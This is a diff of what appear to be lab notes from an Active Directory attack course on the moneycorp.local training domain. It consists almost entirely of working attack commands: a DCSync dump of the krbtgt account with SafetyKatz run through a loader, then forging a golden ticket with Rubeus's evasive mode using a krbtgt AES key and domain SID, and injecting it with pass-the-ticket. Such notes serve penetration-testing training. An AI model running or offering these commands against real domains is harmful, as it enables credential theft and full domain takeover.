@@ -23,9 +23,14 @@ Run DCsync on parent domain
 C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
 ```
 
-Access parent domain DC
+Forge golden ticket to access parent domain DC
 ```powershell
-C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args diamond /krbkey:90ec02cc0396de7e08c7d5a163c21fd59fcb9f8163254f9775fc2604b9aedb5e /tgtdeleg /enctype:aes /ticketuser:administrator /domain:moneycorp.local /dc:mcorp-dc.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:90ec02cc0396de7e08c7d5a163c21fd59fcb9f8163254f9775fc2604b9aedb5e /sid:S-1-5-21-335606122-960912869-3279953914 /ldap /user:Administrator /domain:moneycorp.local /printcmd
+```
+
+Run displayed command and add `/ptt`
+```powershell
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args Evasive-Golden /aes256:90EC02CC0396DE7E08C7D5A163C21FD59FCB9F8163254F9775FC2604B9AEDB5E /user:Administrator /id:500 /pgid:513 /domain:moneycorp.local /sid:S-1-5-21-335606122-960912869-3279953914 /pwdlastset:"11/11/2022 6:34:22 AM" /logoncount:550 /netbios:mcorp /groups:544,512,520,513 /dc:MCORP-DC.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
 ```
 
 > **Note:** Can only access resources that were explicitly shared with you
